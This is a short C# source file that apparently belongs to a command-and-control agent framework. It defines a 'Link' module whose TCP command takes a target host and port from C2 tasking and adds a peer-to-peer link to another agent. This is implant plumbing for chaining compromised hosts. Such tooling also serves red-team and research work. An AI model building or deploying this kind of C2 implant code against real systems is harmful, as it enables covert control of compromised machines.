using Agent.Comms;
using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.Linq;

namespace Agent.Modules
{
    public class LinkModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Link",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "TCP",
                        Delegate = LinkTCPAgent
                    }
                }
            };
        }

        private void LinkTCPAgent(string AgentID, C2Data C2Data)
        {
            var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;

            var target = (string)parameters.FirstOrDefault(p => p.Name.Equals("Target", StringComparison.OrdinalIgnoreCase)).Value;
            var port = (int)parameters.FirstOrDefault(p => p.Name.Equals("Port", StringComparison.OrdinalIgnoreCase)).Value;

            var commModule = new TCPCommModule(target, port);
            Agent.AddP2PAgent(commModule);
        }
    }
}